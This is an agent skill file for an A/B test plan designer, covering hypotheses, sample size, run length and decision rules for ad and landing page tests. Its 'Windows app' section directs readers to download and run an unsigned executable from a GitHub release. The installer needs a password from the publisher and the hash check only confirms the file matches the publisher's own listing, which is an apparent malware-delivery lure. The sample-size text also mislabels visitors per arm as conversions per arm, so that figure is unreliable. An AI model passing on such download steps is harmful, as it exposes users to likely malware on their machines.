---
name: ab-test-plan-designer
description: Designs an ad or landing page test with one variable, a sample size, a run length and a decision rule, and logs the result before the next round. Use when the user asks for ab test plan template, sample size for conversion test, ad split test plan. For US growth teams and media buyers who test landing pages, offers and ad creative.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# A/B Test Plan Designer

**Designs an ad or landing page test with one variable, a sample size, a run length and a decision rule, and logs the result before the next round.** Written for US growth teams and media buyers who test landing pages, offers and ad creative.

Use this skill when someone asks for:

- ab test plan template
- sample size for conversion test
- ad split test plan
- test decision rule

---

## The job

Teams change the headline, the image and the offer at once, call the winner after four days, and ship a change that was never distinguishable from noise.

## What you get

1. Collect the hypothesis, the baseline conversion rate, the smallest change worth shipping and the metric that decides the test.
2. Compute the sample size per arm from the baseline rate and the effect the team wants to detect.
3. Set the run length, the traffic split, the stop rules and the decision rule before the test starts.
4. Write the log entry after the test, including what the test could not answer.

Output contract:

- plan - hypothesis, variable, control, variant, traffic split and run length
- sample_size - the required conversions per arm with the formula shown
- decision_rule - what result counts as a win, a loss and an inconclusive test
- guardrails - the metrics that must not get worse while the test runs
- log_entry - the result, the numbers it was based on and the next action

## US specifics that matter

- Meta's A/B testing guidance says to change one element at a time and to run a test for at least two weeks, and Meta's business site advertises testing up to five ad variants.
- Google Ads ad variations run for a duration of 84 days or fewer, and the experiment split is set as a percentage of the campaign budget, with a 50/50 split between the original and the variation, which does not guarantee an even impression split.
- For a two-sided conversion rate test at 95% confidence and 80% power the required conversions per arm are 16 times p(1-p) divided by the square of the absolute difference, where p is the baseline conversion rate.
- The 16 comes from (1.96 + 0.84) squared, which is 7.85, doubled for the variance of both arms, so a test on a 5% baseline looking for a one point absolute lift needs about 7,600 conversions per arm.

## Guardrails (hard rules)

- Never stop a test early because the numbers look good; the run length is set before the launch.
- Never change more than one variable in a test, and never change the audience while the test runs.
- Never call a result that does not reach the required sample size a win.
- Never run the test in the ad platform; the plan is a document the team executes themselves.

## Quickstart

### 1. Fill in the brief

`templates/ab-test-plan.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/sample_size.py --input ab-test-plan.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/experiment-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Sample size**

- n per arm = 16 * p(1-p) / d^2, with p the baseline rate and d the absolute difference to detect.
- The multiplier is 16 for 95% confidence and 80% power; wider confidence or higher power needs a bigger multiplier.
- A bigger baseline rate needs fewer conversions for the same absolute difference; a smaller difference needs many more.

**One variable, one decision rule**

- Change the headline, or the image, or the offer; not two at once.
- Write the decision rule before the test: what counts as a win, a loss and an inconclusive result.
- Set stop rules for spend, for a broken page and for a tracking failure.

**How the platforms run tests**

- Meta splits the audience evenly and asks for at least two weeks of runtime.
- Google's ad variation feature caps the duration at 84 days and splits the budget by percentage, and a 50/50 split does not guarantee an even impression split.
- Both platforms report a confidence level, so agree on yours before the launch.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/experiment-rules.md` - Rules for a test that survives a finance review
- `templates/ab-test-plan.yaml` - the brief to fill in
- `scripts/sample_size.py` - the working script

## Verify the bundle

```bash
python3 scripts/sample_size.py --input ab-test-plan.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
